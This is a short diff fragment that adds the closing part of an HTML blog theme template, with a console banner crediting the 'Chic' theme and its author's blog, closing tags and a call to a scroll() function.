+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
